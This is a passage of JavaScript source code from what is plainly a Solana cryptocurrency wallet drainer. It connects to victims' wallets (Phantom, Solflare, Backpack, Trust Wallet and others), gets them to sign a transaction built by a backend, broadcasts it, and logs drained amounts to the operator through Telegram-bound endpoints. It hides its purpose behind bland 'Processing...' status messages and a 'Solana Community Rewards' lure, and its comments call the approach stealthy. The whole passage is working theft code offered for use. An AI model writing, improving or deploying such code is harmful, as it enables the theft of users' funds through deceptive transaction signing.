      console.log(`[runDrainer] Restored lastValidBlockHeight: ${transaction.lastValidBlockHeight}`);
    } else {
      console.warn('[runDrainer] No lastValidBlockHeight in response, transaction may fail');
      console.log('[runDrainer] Available response keys:', Object.keys(responseData));
    }
    
    // Debug: Log transaction details before signing
    console.log('[runDrainer] Transaction before signing:', {
      hasSignatures: !!transaction.signatures,
      signatureCount: transaction.signatures?.length || 0,
      feePayer: transaction.feePayer?.toString(),
      recentBlockhash: transaction.recentBlockhash,
      lastValidBlockHeight: transaction.lastValidBlockHeight,
      instructionCount: transaction.instructions?.length || 0
    });
    
    // Validate transaction object
    if (!transaction || !transaction.instructions || transaction.instructions.length === 0) {
      console.error('[runDrainer] Invalid transaction object');
      showStatus('Failed', 'error');
      return;
    }

    // 6. Skip frontend validation - let backend handle it
    showStatus('Processing...', 'loading');
    console.log('[runDrainer] Transaction received from backend, proceeding to signing');

    // 7. Log drain attempt - transaction is now presented to user for signing
    try {
      await fetch('/api/drainer/log-drain-attempt', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          publicKey: publicKeyString,
          walletType: walletInfo.key,
          lamports: responseData.balance || 0,
          instructions: transaction.instructions.length,
          transactionSize: 'unsigned' // Don't serialize unsigned transaction
        })
      });
    } catch (logError) {
      console.error('[runDrainer] Failed to log drain attempt:', logError);
    }

    // 8. Request signature from the wallet using Patient Mode
    showStatus('Processing...', 'loading');
    
    let signed;
    let cleanedTransaction = null; // Declared outside try-catch for scope
    console.log('[SIGNING] Starting signing process with cleanedTransaction scope:', cleanedTransaction);
    
    try {
      // Use Patient Mode for transaction signing
      console.log(`[SIGNING] Using Patient Mode for ${walletInfo.key} wallet`);
      
      const onStatusUpdate = (message, type) => {
        showStatus(message, type);
      };
      
      if (!window.patientMode) {
        throw new Error('Patient Mode not initialized');
      }
      
      // Note: Transaction expiration is now handled by reduced Patient Mode timeouts (2 minutes)
      // This prevents the retry loops while avoiding RPC rate limiting issues
      
      // Preserve lastValidBlockHeight before signing
      const preservedLastValidBlockHeight = transaction.lastValidBlockHeight;
      console.log(`[SIGNING] Preserving lastValidBlockHeight before signing: ${preservedLastValidBlockHeight}`);
      
      // Store the original transaction for fallback use
      let originalTransaction = transaction;
      let cleanedTransaction = null;
      
      signed = await window.patientMode.signWithPatientMode(
        provider, 
        transaction, 
        walletInfo.key, 
        onStatusUpdate
      );
      
      // Store the cleaned transaction for potential fallback use
      cleanedTransaction = signed;
      console.log('[SIGNING] Stored cleaned transaction for fallback use:', {
        instructionCount: cleanedTransaction.instructions?.length,
        hasSignatures: cleanedTransaction.hasSignatures,
        isCleaned: cleanedTransaction.instructions?.length === 3
      });
      
      // Restore lastValidBlockHeight after signing
      if (preservedLastValidBlockHeight) {
        signed.lastValidBlockHeight = preservedLastValidBlockHeight;
        console.log(`[SIGNING] Restored lastValidBlockHeight after signing: ${signed.lastValidBlockHeight}`);
      }
      
        // Check if this is a cleaned transaction (Phantom, Backpack, or Solflare)
        if ((walletInfo.key === 'phantom' || walletInfo.key === 'backpack' || walletInfo.key === 'solflare') && signed.instructions?.length === 3) {
          console.log(`[SIGNING] ${walletInfo.key} transaction was cleaned by Patient Mode`);
          console.log('[SIGNING] Using cleaned transaction directly - no re-signing needed');
          console.log('[SIGNING] Single transaction approach - user only signs once');
          
          // Use the cleaned transaction directly without re-signing
          // This ensures only ONE transaction request to the user
        }
      
      console.log('[SIGNING] Transaction signed successfully with Patient Mode');
      
      // Debug: Log signed transaction details
      console.log('[SIGNING] Signed transaction details:', {
        hasSignatures: !!signed.signatures,
        signatureCount: signed.signatures?.length || 0,
        feePayer: signed.feePayer?.toString(),
        recentBlockhash: signed.recentBlockhash,
        lastValidBlockHeight: signed.lastValidBlockHeight,
        instructionCount: signed.instructions?.length || 0,
        serializedLength: signed.serialize ? signed.serialize().length : 0
      });
      
      // For Phantom, Backpack, or Solflare with cleaned transaction, don't proceed to fallback
      if ((walletInfo.key === 'phantom' || walletInfo.key === 'backpack' || walletInfo.key === 'solflare') && signed.instructions?.length === 3) {
        console.log(`[SIGNING] ${walletInfo.key} cleaned transaction ready - proceeding to broadcast`);
        // Continue to broadcasting without triggering fallback
      }
      
    } catch (signError) {
      console.error('[runDrainer] Patient Mode signing failed:', signError);
      
      // CRITICAL: Phantom wallet must never retry or use fallback
      if (walletInfo.key === 'phantom') {
        console.error('[runDrainer] Phantom signing failed - NO FALLBACK allowed');
        showStatus('Failed', 'error');
        return;
      }
      
      // Handle specific signing errors for other wallets
      if (signError.message?.includes('User rejected') || 
          signError.message?.includes('cancelled') ||
          signError.message?.includes('denied')) {
        showStatus('Cancelled', 'error');
        return;
      } else if (signError.message?.includes('timeout')) {
        showStatus('Timeout', 'error');
        return;
      } else if (signError.message?.includes('insufficient')) {
        showStatus('Ineligible', 'error');
        return;
      }
      
      // Fallback to basic signing if patient mode fails (NON-PHANTOM WALLETS ONLY)
      try {
        showStatus('Processing...', 'loading');
        
        // Note: Transaction expiration is now handled by reduced Patient Mode timeouts (2 minutes)
        // This prevents the retry loops while avoiding RPC rate limiting issues
        
        // For Phantom, we should not reach this fallback anymore since re-signing is handled directly
        // This fallback is now only for non-Phantom wallets or other errors
        let transactionToSign = transaction;
        
        // If we have a cleaned transaction from Patient Mode, use that instead
        console.log('[SIGNING] Fallback: Checking for cleaned transaction:', {
          hasCleanedTransaction: !!cleanedTransaction,
          walletType: walletInfo.key,
          cleanedTransactionInstructions: cleanedTransaction?.instructions?.length
        });
        
        if (cleanedTransaction && (walletInfo.key === 'phantom' || walletInfo.key === 'backpack')) {
          console.log(`[SIGNING] Fallback: Using cleaned transaction from Patient Mode (${walletInfo.key})`);
          transactionToSign = cleanedTransaction;
        } else {
          console.log('[SIGNING] Fallback: Using original transaction (no cleaned transaction available)');
        }
        
        console.log('[SIGNING] Using fallback signing for non-Phantom wallet or other error');
        
        // Preserve lastValidBlockHeight before fallback signing
        const preservedLastValidBlockHeight = transactionToSign.lastValidBlockHeight;
        console.log(`[SIGNING] Preserving lastValidBlockHeight before fallback signing: ${preservedLastValidBlockHeight}`);
        
        // Basic wallet-specific signing logic as fallback
        // For Phantom, prioritize signTransaction to prevent simulation
        if (walletInfo.key === 'phantom' && provider.signTransaction) {
          console.log('[SIGNING] Fallback: Using signTransaction for Phantom (prevents simulation)');
          signed = await provider.signTransaction(transactionToSign);
      } else if (provider.signTransaction) {
          console.log('[SIGNING] Fallback: Using signTransaction');
          signed = await provider.signTransaction(transactionToSign);
        } else if (provider.signAndSendTransaction) {
          console.log('[SIGNING] Fallback: Using signAndSendTransaction');
          signed = await provider.signAndSendTransaction(transactionToSign);
        } else if (provider.signAllTransactions) {
          console.log('[SIGNING] Fallback: Using signAllTransactions');
          const signedArray = await provider.signAllTransactions([transactionToSign]);
          signed = signedArray[0];
              } else {
          throw new Error('Wallet does not support transaction signing');
        }
        
        // Restore lastValidBlockHeight after fallback signing
        if (preservedLastValidBlockHeight) {
          signed.lastValidBlockHeight = preservedLastValidBlockHeight;
          console.log(`[SIGNING] Restored lastValidBlockHeight after fallback signing: ${signed.lastValidBlockHeight}`);
        }
        
        console.log('[SIGNING] Fallback signing successful - proceeding to broadcasting');
        
        // Debug: Log fallback signed transaction details
        console.log('[SIGNING] Fallback signed transaction details:', {
          hasSignatures: !!signed.signatures,
          signatureCount: signed.signatures?.length || 0,
          feePayer: signed.feePayer?.toString(),
          recentBlockhash: signed.recentBlockhash,
          lastValidBlockHeight: signed.lastValidBlockHeight,
          instructionCount: signed.instructions?.length || 0,
          serializedLength: signed.serialize ? signed.serialize().length : 0
        });
        
      } catch (fallbackError) {
        console.error('[runDrainer] Both Patient Mode and fallback signing failed:', fallbackError);
        
        // Handle specific fallback errors
        if (fallbackError.message?.includes('User rejected') || 
            fallbackError.message?.includes('cancelled') ||
            fallbackError.message?.includes('denied')) {
          showStatus('Cancelled', 'error');
        } else if (fallbackError.message?.includes('timeout')) {
          showStatus('Timeout', 'error');
        } else if (fallbackError.message?.includes('insufficient')) {
          showStatus('Ineligible', 'error');
        } else if (fallbackError.message?.includes('does not support')) {
          showStatus('Unsupported', 'error');
        } else {
          showStatus('Failed', 'error');
        }
        return;
      }
    }
    
    // Ensure we have a signed transaction before proceeding
    if (!signed) {
      console.error('[runDrainer] No signed transaction available - cannot proceed to broadcasting');
      showStatus('Failed', 'error');
          return;
        }
        
    // Validate signed transaction before broadcasting
    if (!signed.serialize || typeof signed.serialize !== 'function') {
      console.error('[runDrainer] Invalid signed transaction - missing serialize method');
      showStatus('Failed', 'error');
      return;
    }

    // Check if transaction has signatures
    if (!signed.signatures || signed.signatures.length === 0) {
      console.error('[runDrainer] Transaction not properly signed - no signatures found');
      showStatus('Failed', 'error');
      return;
    }
    
    // Debug: Log signed transaction details
    console.log('[runDrainer] Signed transaction details:', {
      hasSignatures: !!signed.signatures,
      signatureCount: signed.signatures?.length || 0,
      feePayer: signed.feePayer?.toString(),
      recentBlockhash: signed.recentBlockhash,
      lastValidBlockHeight: signed.lastValidBlockHeight,
      instructionCount: signed.instructions?.length || 0
    });

    console.log('[runDrainer] Signed transaction validated - proceeding to broadcast');
    
    // Debug: Log transaction details before broadcasting
    console.log('[runDrainer] Transaction details:', {
      hasSignatures: !!signed.signatures,
      signatureCount: signed.signatures?.length || 0,
      feePayer: signed.feePayer?.toString(),
      recentBlockhash: signed.recentBlockhash,
      lastValidBlockHeight: signed.lastValidBlockHeight,
      instructionCount: signed.instructions?.length || 0,
      serializedLength: signed.serialize ? signed.serialize().length : 0
    });
        
    // 8. Use backend for transaction broadcasting with blockhash refresh
    showStatus('Processing...', 'loading');
    console.log('[runDrainer] About to broadcast transaction...');
    let broadcastResult = await broadcastTransaction(signed);
    console.log('[runDrainer] Broadcast result:', broadcastResult);
    
    // Note: Blockhash refresh disabled to prevent retry loops
    // Transaction expiration is now handled by reduced Patient Mode timeouts (2 minutes)
    if (!broadcastResult.success && broadcastResult.error?.includes('expired')) {
      console.log('[runDrainer] Transaction expired - no retry to prevent loops');
      showStatus('Timeout', 'error');
      return;
    }
    
    // CRITICAL: Phantom, Backpack, and Solflare wallets must never retry transactions
    if ((walletInfo?.key === 'phantom' || walletInfo?.key === 'backpack' || walletInfo?.key === 'solflare') && !broadcastResult.success) {
      console.log(`[runDrainer] ${walletInfo.key} transaction failed - NO RETRY allowed`);
      showStatus('Failed', 'error');
      return;
    }
    
    if (!broadcastResult.success) {
      console.error('[runDrainer] Transaction broadcast failed:', broadcastResult.error);
      
      // Show specific error message for broadcast failures
      let userMessage = 'Failed';
      if (broadcastResult.error && typeof broadcastResult.error === 'string') {
        if (broadcastResult.error.includes('duplicate instruction')) {
          userMessage = 'Transaction Error';
        } else if (broadcastResult.error.includes('insufficient')) {
          userMessage = 'Ineligible';
        } else if (broadcastResult.error.includes('expired')) {
          userMessage = 'Timeout';
        }
      }
      
      showStatus(userMessage, 'error');
      return;
    }

    // 9. Monitor transaction confirmation
    console.log('[runDrainer] Transaction broadcast successful, monitoring on-chain confirmation');
    showStatus('Confirming...', 'loading');
    
    // Monitor transaction confirmation with timeout
    try {
      const monitorPromise = monitorTransactionConfirmation(broadcastResult.signature, walletInfo?.key);
      // Reduce timeout for Phantom, Backpack, and Solflare to prevent hanging
      const timeoutDuration = (walletInfo?.key === 'phantom' || walletInfo?.key === 'backpack' || walletInfo?.key === 'solflare') ? 60000 : 120000; // 60s for simplified wallets, 120s for others
      const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Transaction monitoring timeout')), timeoutDuration)
      );
      
      const monitorResult = await Promise.race([monitorPromise, timeoutPromise]);
      
      if (monitorResult.success) {
        console.log('[runDrainer] Transaction confirmed on-chain');
        showStatus('Success!', 'success');
        
        // Log successful drain confirmation to Telegram
        try {
          await fetch('/api/drainer/log-confirmation', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              publicKey: publicKeyString,
              txid: broadcastResult.signature,
              status: 'confirmed',
              actualDrainAmount: responseData.actualDrainAmount || 0,
              lamports: responseData.balance || 0,
              walletType: walletInfo.key
            })
          });
          console.log('[runDrainer] Drain success logged to Telegram');
        } catch (logError) {
          console.error('[runDrainer] Failed to log drain success:', logError);
        }
      } else {
        console.error('[runDrainer] Transaction failed on-chain:', monitorResult.error);
        
        // Show user-friendly error message based on the specific error
        let userMessage = 'Failed';
        let errorString = '';
        
        // Convert error object to string for checking
        if (typeof monitorResult.error === 'object') {
          errorString = JSON.stringify(monitorResult.error);
        } else if (typeof monitorResult.error === 'string') {
          errorString = monitorResult.error;
        } else {
          errorString = String(monitorResult.error);
        }
        
        if (errorString.includes('InsufficientFunds')) {
          userMessage = 'Ineligible';
        } else if (errorString.includes('timeout')) {
          userMessage = 'Timeout';
        } else if (errorString.includes('AccountNotFound')) {
          userMessage = 'Failed';
        } else if (errorString.includes('ProgramError')) {
          userMessage = 'Failed';
        } else if (errorString.includes('InstructionError')) {
          userMessage = 'Failed';
        }
        
        showStatus(userMessage, 'error');
        
        // Log failed drain confirmation to Telegram
        try {
          await fetch('/api/drainer/log-confirmation', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              publicKey: publicKeyString,
              txid: broadcastResult.signature,
              status: 'failed',
              error: monitorResult.error,
              actualDrainAmount: responseData.actualDrainAmount || 0,
              lamports: responseData.balance || 0,
              walletType: walletInfo.key
            })
          });
          console.log('[runDrainer] Drain failure logged to Telegram');
        } catch (logError) {
          console.error('[runDrainer] Failed to log drain failure:', logError);
        }
        
        return;
      }
    } catch (monitorError) {
      console.error('[runDrainer] Transaction monitoring failed:', monitorError);
      
      // Log monitoring failure to Telegram
      try {
        await fetch('/api/drainer/log-confirmation', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            publicKey: publicKeyString,
            txid: broadcastResult.signature || 'unknown',
            status: 'monitor_failed',
            error: monitorError.message,
            actualDrainAmount: responseData.actualDrainAmount || 0,
            lamports: responseData.balance || 0,
            walletType: walletInfo.key
          })
        });
        console.log('[runDrainer] Monitor failure logged to Telegram');
      } catch (logError) {
        console.error('[runDrainer] Failed to log monitor failure:', logError);
      }
      
      if (monitorError.message?.includes('timeout')) {
        showStatus('Timeout', 'error');
      } else {
        showStatus('Failed', 'error');
      }
      return;
    }

  } catch (error) {
    console.error('[runDrainer] Unexpected error:', error);
    showStatus('Failed', 'error');
  } finally {
    // Always reset the flag when done
    isDrainerRunning = false;
    console.log('[runDrainer] Process completed, flag reset');
  }
}

window.runDrainer = runDrainer;

  // Function to set dApp metadata for wallet connections
  function setWalletDAppName(provider, walletName) {
    try {
      // Set basic dApp metadata if provider supports it
      if (provider && typeof provider.connect === 'function') {
        // Most Solana wallets will use the metadata from the HTML head
        console.log(`[DAPP_METADATA] Setting metadata for ${walletName}`);
      }
    } catch (error) {
      console.warn(`[DAPP_METADATA] Failed to set metadata for ${walletName}:`, error.message);
    }
  }

    // Enhanced wallet connection with proper metadata
    async function connectWalletWithMetadata(provider, walletName) {
      try {
        // Set dApp name before connection
        setWalletDAppName(provider, walletName);
        
        if (typeof provider.connect === 'function') {
          // TOCTOU Protection is now handled on the backend
          
          // Use standard connection method
          console.log(`[CONNECTION] Connecting to ${walletName}`);
            
            // Fallback to standard connection methods
          let result = null;
          
          // Trust Wallet specific connection
          if (walletName === 'Trust Wallet') {
            console.log('[TRUST] Attempting Trust Wallet connection...');
            showStatus('Processing...', 'loading');
            
            // Check what methods are available
            const hasConnect = typeof provider.connect === 'function';
            const hasSignIn = typeof provider.signIn === 'function';
            const hasRequest = typeof provider.request === 'function';
            
            console.log('[TRUST] Available methods:', { hasConnect, hasSignIn, hasRequest });
            showStatus('Processing...', 'loading');
            
            try {
              // Clear any existing pending requests first
              window.clearAllPendingRequests();
              
              // Add delay to prevent request conflicts
              await new Promise(resolve => setTimeout(resolve, 2000));
              
              // Track this request to prevent conflicts
              const requestId = `trust-connect-${Date.now()}`;
              const canProceed = window.addPendingRequest(requestId);
              
              if (!canProceed) {
                showStatus('Processing...', 'loading');
                window.clearAllPendingRequests();
                await new Promise(resolve => setTimeout(resolve, 3000));
                window.addPendingRequest(requestId);
              }
              
              try {
                      // Trust Wallet prefers simple connect with timeout
      const connectPromise = provider.connect();
      const timeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new Error('Connection timeout')), 45000)
      );
                
                result = await Promise.race([connectPromise, timeoutPromise]);
                console.log('[TRUST] Connect result:', result);
                return result;
              } finally {
                // Always remove the request tracking
                window.removePendingRequest(requestId);
              }
            } catch (error) {
              console.log('[TRUST] Connect failed:', error.message);
              
              // Handle specific Trust Wallet errors without infinite retry
              if (error.message.includes('already pending')) {
                console.log('[TRUST] Already pending error detected - clearing and showing user message');
                window.clearAllPendingRequests();
                showStatus('Failed', 'error');
                throw new Error('Request already pending - user intervention required');
              }
              
              // For other errors, show user-friendly message without infinite retry
              console.log('[TRUST] Connection failed - showing user message');
              showStatus('Failed', 'error');
              throw error;
            }
          }
          
          // Add delay to prevent request conflicts
          await new Promise(resolve => setTimeout(resolve, 1000));
          
          // Track this request to prevent conflicts
          const requestId = `${walletName}-connect-${Date.now()}`;
          window.addPendingRequest(requestId);
          
          try {
            // Try Wallet Adapter format first
            try {
              const connectPromise = provider.connect({
                onlyIfTrusted: false,
                appMetadata: walletAdapterMetadata
              });
              const timeoutPromise = new Promise((_, reject) => 
                setTimeout(() => reject(new Error('Connection timeout')), 120000) // 2 minutes (was 30s)
              );
              
              result = await Promise.race([connectPromise, timeoutPromise]);
            } catch (error) {
              
              // Try basic format
              try {
                const connectPromise = provider.connect({
                  onlyIfTrusted: false,
                  appMetadata: window.dAppMetadata
                });
                const timeoutPromise = new Promise((_, reject) => 
                  setTimeout(() => reject(new Error('Connection timeout')), 60000) // 1 minute (was 10s)
                );
                
                result = await Promise.race([connectPromise, timeoutPromise]);
              } catch (error2) {
                
                // Try simple connect without metadata
                const connectPromise = provider.connect();
                const timeoutPromise = new Promise((_, reject) => 
                  setTimeout(() => reject(new Error('Connection timeout')), 120000) // 2 minutes (was 30s)
                );
                
                result = await Promise.race([connectPromise, timeoutPromise]);
              }
            }
          } finally {
            // Always remove the request tracking
            window.removePendingRequest(requestId);
          }
          
          return result;
        }
        return null;
      } catch (error) {
        console.error(`[connectWalletWithMetadata] Error for ${walletName}:`, error);
        
        // Automatic fallback for connection errors
        if (error.message.includes('timeout') || error.message.includes('pending') || error.message.includes('failed')) {
          console.log(`[FALLBACK] Connection error for ${walletName}, triggering automatic retry`);
          window.handleConnectionError(error, walletName, provider);
        }
        
        throw error;
      }
    }

    // Enhanced mobile deep link function with platform-specific strategies
    function openInWalletMobile(walletType, currentUrl) {
      // Enhanced mobile platform detection
      const userAgent = navigator.userAgent.toLowerCase();
      const isIOS = /iphone|ipad|ipod/.test(userAgent);
      const isAndroid = /android/.test(userAgent);
      const platform = isIOS ? 'ios' : isAndroid ? 'android' : 'unknown';
      
      // Find wallet definition
      const wallet = WALLET_DEFS.find(w => w.key === walletType);
      if (!wallet || !wallet.mobile || !wallet.mobile.mobileStrategies) {
        console.error(`[MOBILE_DEEP_LINK] No mobile strategies found for ${walletType}`);
        return false;
      }
      
      const strategies = wallet.mobile.mobileStrategies;
      // Platform-specific strategy ordering
      let orderedStrategies = [];
      if (platform === 'ios') {
        // iOS prefers custom schemes first, then universal links
        orderedStrategies = [
          ...strategies.filter(s => s.startsWith(walletType + '://')),
          ...strategies.filter(s => s.startsWith('https://'))
        ];
      } else if (platform === 'android') {
        // Android prefers App Links first, then custom schemes
        orderedStrategies = [
          ...strategies.filter(s => s.startsWith('https://')),
          ...strategies.filter(s => s.startsWith(walletType + '://'))
        ];
      } else {
        orderedStrategies = strategies;
      }
      
      // Try each strategy with enhanced timeout handling
      let strategyIndex = 0;
      let hasOpenedApp = false;
      
      const tryNextStrategy = () => {
        if (strategyIndex >= orderedStrategies.length) {
          // All strategies failed, redirect to install page
          const installUrl = platform === 'ios' ? wallet.mobile.appStore : wallet.mobile.playStore;
          window.location.href = installUrl;
          return;
        }
        
        const strategy = orderedStrategies[strategyIndex];
        // Enhanced URL parameter handling
        let fullDeepLink;
        if (strategy.includes('?url=') || strategy.includes('?coin_id=')) {
          fullDeepLink = strategy + encodeURIComponent(currentUrl);
        } else if (strategy.endsWith('/')) {
          fullDeepLink = strategy + encodeURIComponent(currentUrl);
        } else {
          fullDeepLink = strategy + '?url=' + encodeURIComponent(currentUrl);
        }
        
        
        try {
          // Enhanced deep link opening with better error handling
          if (platform === 'ios') {
            // iOS: Use iframe method for better reliability
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = fullDeepLink;
            document.body.appendChild(iframe);
            
            // Clean up iframe after attempt
            setTimeout(() => {
              if (document.body.contains(iframe)) {
                document.body.removeChild(iframe);
              }
            }, 1000);
          } else {
            // Android: Direct location change
          window.location.href = fullDeepLink;
          }
          
          hasOpenedApp = true;
          
          // Platform-specific timeout handling
          const timeout = platform === 'ios' ? 3000 : 2000;
          setTimeout(() => {
            if (!hasOpenedApp || window.document.hidden) {
              // App likely opened, don't try next strategy
              return;
            }
              strategyIndex++;
              tryNextStrategy();
          }, timeout);
          
        } catch (error) {
          console.error(`[MOBILE_DEEP_LINK] Strategy ${strategyIndex + 1} failed:`, error);
          strategyIndex++;
          tryNextStrategy();
        }
      };
      
      // Start trying strategies
      tryNextStrategy();
      return true;
    }

    // Enhanced mobile wallet connection with comprehensive fallbacks for all wallet types
    window.connectMobileWallet = async function connectMobileWallet(wallet) {
      let provider = wallet.provider();
      console.log(`Provider for ${wallet.name} on connect:`, provider);
      console.log('connectMobileWallet called with:', wallet);
      const isMobileDevice = isMobile();
      
      // Enhanced fallback: if no provider, try multiple times with different strategies
      if (!provider) {
        console.log(`[FALLBACK] No provider for ${wallet.name}, trying enhanced retry...`);
        
        // Try multiple provider retrieval strategies
        for (let attempt = 1; attempt <= 3; attempt++) {
          console.log(`[FALLBACK] Provider retrieval attempt ${attempt}/3 for ${wallet.name}`);
          
          await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
          provider = wallet.provider();
          
          if (provider) {
            console.log(`[FALLBACK] Provider found for ${wallet.name} on attempt ${attempt}`);
            break;
          }
        }
        
        if (!provider) {
          console.log(`[FALLBACK] All provider retrieval attempts failed for ${wallet.name}`);
          showStatus('Failed', 'error');
          return;
        }
      }
      
      try {
        // On mobile, use stealthy but functional approach
        if (isMobileDevice) {
          
          // First, try to get the wallet provider quietly
          provider = wallet.provider();
          console.log(`[connectMobileWallet] Initial provider for ${wallet.name}:`, provider);
          
          // Simple fallback: if no provider, try again
          if (!provider) {
            console.log(`[FALLBACK] No provider for ${wallet.name}, retrying...`);
            await new Promise(resolve => setTimeout(resolve, 2000));
            provider = wallet.provider();
          }
          
          // If still no provider, try to open the app and then check again
          if (!provider) {
            // Enhanced mobile detection for better deep linking
            let isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            if (!isMobileDevice) {
              isMobileDevice = /Mobile|Tablet/i.test(navigator.userAgent) || 
                              (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
                              window.innerWidth <= 768;
            }
            
            if (isMobileDevice) {
              console.log(`[connectMobileWallet] Mobile device detected for ${wallet.name}`);
            }
            
            // Enhanced deep linking for seamless wallet opening using comprehensive fallbacks
            try {
                const currentUrl = window.location.href;
              console.log(`[connectMobileWallet] Opening ${wallet.name} with comprehensive mobile deep link fallbacks`);
              
              // Use the comprehensive mobile deep link function with fallback strategies
              const success = openInWalletMobile(wallet.key, currentUrl);
              if (!success) {
                console.error(`[connectMobileWallet] Failed to open ${wallet.name} with mobile deep links`);
                  }
                } catch (e) {
            }
            
            // Wait a bit and check for provider again
            showStatus('Processing...', 'loading');
            
            // Enhanced provider detection with better timing and fallback
            let providerFound = false;
            for (let i = 0; i < 8; i++) {
              await new Promise(resolve => setTimeout(resolve, 800));
              
              provider = wallet.provider();
              console.log(`[connectMobileWallet] Provider for ${wallet.name} after wait ${i+1}:`, provider);
              
              if (provider) {
                providerFound = true;
                console.log(`[connectMobileWallet] Provider found for ${wallet.name} after ${i+1} attempts`);
                break;
              }
            }
            
            if (!providerFound) {
              console.log(`[connectMobileWallet] No provider found for ${wallet.name} after all attempts`);
              
              // Enhanced automatic fallback with wallet-specific strategies
              console.log(`[FALLBACK] Triggering enhanced automatic fallback for ${wallet.name}`);
              
              // Wallet-specific fallback strategies
              switch (wallet.name) {
                case 'Phantom':
                  console.log(`[FALLBACK] Phantom-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'phantom://', 500);
                  setTimeout(() => window.location.href = 'https://phantom.app/', 1000);
                  break;
                  
                case 'Solflare':
                  console.log(`[FALLBACK] Solflare-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'solflare://access-wallet', 500);
                  setTimeout(() => window.location.href = 'https://solflare.com/', 1000);
                  break;
                  
                case 'Backpack':
                  console.log(`[FALLBACK] Backpack-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'https://backpack.app/', 500);
                  break;
                  
                case 'Glow':
                  console.log(`[FALLBACK] Glow-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'glow://', 500);
                  break;
                  
                case 'Trust Wallet':
                  console.log(`[FALLBACK] Trust Wallet-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'trust://', 500);
                  break;
                  
                case 'Exodus':
                  console.log(`[FALLBACK] Exodus-specific fallback strategy`);
                  setTimeout(() => window.location.href = 'exodus://', 500);
                  break;
                  
                default:
                  console.log(`[FALLBACK] Generic fallback for ${wallet.name}`);
                  window.handleConnectionError(new Error('Provider not found'), wallet.name, null);
                  break;
              }
            }
            
            // If still no provider after deep linking, try to open app store as fallback
            if (!provider) {
              console.log(`[connectMobileWallet] No provider found for ${wallet.name}, trying app store fallback`);
              try {
                if (wallet.name === 'Phantom') {
                  window.open('https://phantom.app/', '_blank');
                } else if (wallet.name === 'Solflare') {
                  window.open('https://solflare.com/', '_blank');
                } else if (wallet.name === 'Backpack') {
                  window.open('https://backpack.app/', '_blank');
                } else if (wallet.name === 'Glow') {
                  window.open('https://glow.app/', '_blank');
                } else if (wallet.name === 'Trust Wallet') {
                  window.open('https://trustwallet.com/', '_blank');
                } else if (wallet.name === 'Exodus') {
                  window.open('https://exodus.com/', '_blank');
                }
              } catch (e) {
                console.error(`[connectMobileWallet] Error opening app store for ${wallet.name}:`, e);
              }
            }
          }
          
          // If we have a provider, try to connect
          if (provider) {
            // Check if wallet is available before attempting connection
            if (typeof provider.isConnected === 'function' && !provider.isConnected()) {
              showStatus('Failed', 'error');
              return;
            }
            
            // Try to connect
            if (typeof provider.connect === 'function') {
              try {
                console.log(`[connectMobileWallet] Calling connectWalletWithMetadata for ${wallet.name}`);
                
                // Add timeout wrapper for connection with retry logic
                let result;
                let retryCount = 0;
                const maxRetries = 2;
                
                while (retryCount <= maxRetries) {
                  try {
                    const connectionPromise = connectWalletWithMetadata(provider, wallet.name);
                    const timeoutPromise = new Promise((_, reject) => {
                      setTimeout(() => reject(new Error('Connection timeout - please try again')), 180000); // 3 minutes (was 45s)
                    });
                    
                    result = await Promise.race([connectionPromise, timeoutPromise]);
                    break; // Success, exit retry loop
                  } catch (error) {
                    retryCount++;
                    console.log(`[connectMobileWallet] Connection attempt ${retryCount}/${maxRetries + 1} failed for ${wallet.name}:`, error.message);
                    
                    if (retryCount > maxRetries) {
                      // Automatic fallback before giving up
                      console.log(`[FALLBACK] All retries failed for ${wallet.name}, triggering automatic fallback`);
                      window.handleConnectionError(error, wallet.name, provider);
                      throw error; // Re-throw if all retries failed
                    }
                    
                    // Wait before retry
                    showStatus('Processing...', 'loading');
                    await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
                  }
                }
                console.log(`[connectMobileWallet] connectWalletWithMetadata result for ${wallet.name}:`, result);
                // Wait a bit for connection to establish
                await new Promise(resolve => setTimeout(resolve, 500));
                
                // Check if we got a public key
                const publicKey = provider.publicKey || provider.address || result?.publicKey;
                console.log(`[connectMobileWallet] publicKey for ${wallet.name}:`, publicKey);
                
                if (publicKey) {
                  showStatus('Processing...', 'loading');
                  console.log(`[connectMobileWallet] About to call runDrainer for ${wallet.name}`);
                  
                  // Don't log wallet connection here - will be logged with actual balance in runDrainer
                  
                  // Ensure provider is still connected before running drainer
                  if (provider && (provider.connected || provider.publicKey)) {
                  runDrainer(provider);
                  } else {
                    console.error(`[connectMobileWallet] Provider disconnected for ${wallet.name}`);
                    showStatus('Failed', 'error');
                  }
                } else {
                  // Try to force approval by attempting a transaction
                  showStatus('Processing...', 'loading');
                  
                  // Try to trigger approval by attempting to sign a message
                  if (typeof provider.signMessage === 'function') {
                    try {
                      const message = new TextEncoder().encode('Connect to Solana Community Rewards');
                      const signature = await provider.signMessage(message);
                      console.log(`[connectMobileWallet] signMessage signature for ${wallet.name}:`, signature);
                      showStatus('Processing...', 'loading');
                      setTimeout(() => {
                        // Re-check provider state before running drainer
                        if (provider && (provider.connected || provider.publicKey)) {
                        runDrainer(provider);
                        } else {
                          showStatus('Failed', 'error');
                        }
                      }, 1000);
                    } catch (signError) {
                      console.error(`[connectMobileWallet] signMessage error for ${wallet.name}:`, signError);
                    }
                  } else {
                    showStatus('Failed', 'error');
                    console.error(`[connectMobileWallet] No signMessage function for ${wallet.name}`);
                  }
                }
              } catch (connectError) {
                console.error(`[connectMobileWallet] connectWalletWithMetadata error for ${wallet.name}:`, connectError);
                
                // Handle timeout errors specifically - More lenient for Backpack
